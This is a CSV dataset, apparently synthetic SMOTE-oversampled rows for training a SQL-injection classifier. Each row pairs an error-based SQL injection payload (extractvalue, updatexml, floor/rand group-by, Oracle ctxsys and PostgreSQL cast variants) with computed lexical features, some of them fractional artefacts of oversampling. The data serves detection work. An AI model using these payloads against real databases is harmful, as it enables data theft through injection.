id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,error,"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",nearest_attack_euclidean,R000088,0.09994380428143373,185.10536726832163,27.889463273167838,3.565286913974727,46.66838981950352,35.44214690732865,77.66322036099297,25.331610180496483,0.2522700432871339,0.19141268423793184,0.41951252988463533,0.13680474259029898,0.0,4.0,0.0,0.0,0.0,2.0,0.0,14.221073453664323,0.0,0.0,5.110536726832161,2.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000012,attack,error,"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000182,0.04979984085880807,277.1670870321161,36.0,3.933621281608179,100.0,35.0,104.33366962569289,37.83341740642322,0.3608301741757273,0.12629056096150454,0.37638537551769613,0.136493889345072,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.833417406423223,2.0,2.0,5.0,4.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000013,attack,error,"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",nearest_attack_euclidean,R000945,0.07687470293455653,365.3728099639326,33.837280996393254,3.3903466092622057,85.0,48.0,168.69824797114606,63.674561992786515,0.23266328664595007,0.13138632657653648,0.4616802090654185,0.17427017771209494,0.0,4.0,1.0,0.0,0.0,3.0,0.0,33.674561992786515,0.0,0.0,0.0,24.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000014,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",nearest_attack_euclidean,R000295,0.03619941430289742,346.2406789503432,39.0,3.861406698889663,110.0,55.0,140.39254316027456,40.84813579006864,0.31771714582356825,0.15885857291178412,0.4054530716409143,0.11797120962373328,4.0,0.0,0.0,0.0,2.0,2.0,0.0,25.84813579006864,0.0,0.0,6.0,5.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000015,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",nearest_attack_euclidean,R000437,0.16593801931302177,322.6122778404649,39.873843440042265,4.0457756994604726,113.49537376016906,55.0,118.24306064025359,35.873843440042265,0.35179960383861647,0.17050570661040537,0.36649401041717783,0.1112006791338003,0.0,4.0,0.0,0.0,2.0,1.1261565599577346,0.0,21.74768688008453,0.0,0.0,6.0,4.126156559957735,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000016,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000269,0.031076012436286462,331.94119767293466,32.01470058176634,3.4365035347953534,81.0,49.0,145.94119767293466,56.0,0.24401964248909322,0.147616820765007,0.4396585987287489,0.16870493801715084,0.014700581766338594,0.0,0.0,0.0,0.0,2.0,0.0,30.985299418233662,0.0,0.0,1.0,22.0,0.014700581766338372,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000017,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000257,0.17098263393173777,141.0,28.688387609652096,3.5812082997663772,56.0,11.999999999999996,59.00000000000001,14.0,0.3971631205673759,0.0851063829787234,0.41843971631205673,0.09929078014184398,1.0,0.0,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000018,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",nearest_attack_euclidean,R000122,0.28765184662979837,316.5784528235092,38.54215471764908,4.027269753546059,109.0,55.0,116.66276225880736,35.91569056470184,0.34439150981682487,0.17377553247637953,0.3684047684313919,0.11342818927540366,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.91569056470184,0.0,0.0,6.0,5.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000019,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000768,0.31007284629555454,190.4451190513426,29.0,3.527318565960381,47.0,32.0,82.55609524107409,28.88902381026852,0.24695741180016725,0.16814121654479475,0.4332419714116665,0.15165940024337152,4.0,0.0,0.0,0.0,1.0,2.0,0.0,14.88902381026852,2.0,0.0,4.0,3.000000000000001,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000020,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",nearest_attack_euclidean,R000471,0.42622020731120147,187.39872052546434,28.617949186448065,3.6154139241562593,45.23589837289612,39.0,76.85384755934419,26.308974593224033,0.24130049045408183,0.20826226029840833,0.41001125728844773,0.1404259919590621,4.0,0.0,0.0,0.0,0.0,1.6910254067759678,0.0,14.617949186448064,0.0,0.0,6.0,1.6910254067759691,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000021,attack,error,"-9606 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij",nearest_attack_euclidean,R000833,0.8123238725552024,334.3034885016932,36.0,3.600062623987767,86.7144183972908,50.6427908013546,140.28558160270921,56.660697700338645,0.2594820129059441,0.151454793439497,0.41957592938757154,0.1694872642669874,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.3213954006773,0.0,1.0179068989840505,0.6606977003386496,23.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000022,attack,error,1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',nearest_attack_euclidean,R000249,0.13206689080814452,361.30234167504983,30.0,3.2459482313467607,78.0,45.0,172.95486961474694,65.34747206030292,0.21633280186966747,0.12480738569403892,0.4779842576470923,0.18087555478920136,4.0,0.0,0.0,0.0,0.0,3.0,0.0,34.34747206030291,2.0,0.0,0.0,23.0,1.0,0.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000023,attack,error,"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",nearest_attack_euclidean,R000724,0.2538189194755584,276.95635179112554,37.39563517911255,4.017387907494939,107.0,35.0,100.16508143290044,34.79127035822511,0.3864620349519094,0.1264128151711853,0.3615281210919458,0.12559702878495949,0.0,4.0,0.0,0.0,2.0,2.0,0.0,18.79127035822511,0.0,2.0,5.0,4.0,0.0,1.0,0.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000024,attack,error,"1"" where 4066  =  4066 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R001020,0.27599555215034005,166.3236726888518,31.648550903327767,3.888461861715623,40.29710180665554,47.0,57.594203613311066,21.43236726888518,0.2421485299760201,0.28323115532573484,0.3456945796862551,0.12892573501198992,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.432367268885178,0.0,0.0,6.0,4.0,0.0,1.0,1.0,1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
